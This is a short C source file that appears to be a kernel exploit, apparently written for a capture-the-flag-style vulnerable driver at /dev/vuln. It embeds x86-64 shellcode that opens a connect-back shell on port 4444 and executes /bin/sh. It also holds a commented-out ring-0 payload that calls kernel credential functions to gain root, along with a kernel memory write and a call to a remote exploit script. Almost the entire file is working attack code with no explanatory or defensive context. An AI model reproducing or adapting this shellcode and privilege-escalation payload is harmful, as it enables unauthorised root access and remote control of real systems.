#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>


unsigned char code[] = 
"\x6a\x29\x58\x6a\x02\x5f\x6a\x01"
"\x5e\x48\x31\xd2\x0f\x05\x48\x97"
"\x6a\x02\x66\xc7\x44\x24\x02\x11"
"\x5c\x54\x6a\x2a\x58\x5e\x6a\x10"
"\x5a\x0f\x05\x6a\x03\x5e\x6a\x21"
"\x58\x48\xff\xce\x0f\x05\xe0\xf6"
"\x48\x31\xf6\x56\x48\xbf\x2f\x62"
"\x69\x6e\x2f\x2f\x73\x68\x57\x54"
"\x5f\xb0\x3b\x99\x0f\x05";

int get_root(){

		 int (*ret)() = (int(*)())code;
    	ret();
    return 0;
}

int main (int argc, char **argv){
	/*
	xor rdi, rdi
	mov rcx, 0xffffffff8107c0a0
	call rcx
	mov rdi, rax
	mov rcx, 0xffffffff8107bd20
	call rcx
	ret
	*/
	/*char sc[] = "\x48\x31\xff\x48\xc7\xc1\x90\x25\x0a\x81\xff\xd1\x48\x89\xc7\x48\xc7\xc1\x60\x22\x0a\x81\xff\xd1\xc3";

	void *sc_addr = mmap((void *)0xdead000, 0x100, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_FIXED|MAP_PRIVATE, -1, 0);
	if (sc_addr == MAP_FAILED) {
		perror("mmap");
		exit(-1);

	}
	memcpy(sc_addr, sc, sizeof(sc));*/
	printf("%p",&get_root);
	
	fflush(stdout);
	//write64(0xffffffffc0002068, sc_addr);
	//open("/dev/vuln", O_RDONLY);
	
	system("remote_exploit_interactive.py");


	return 0;
}
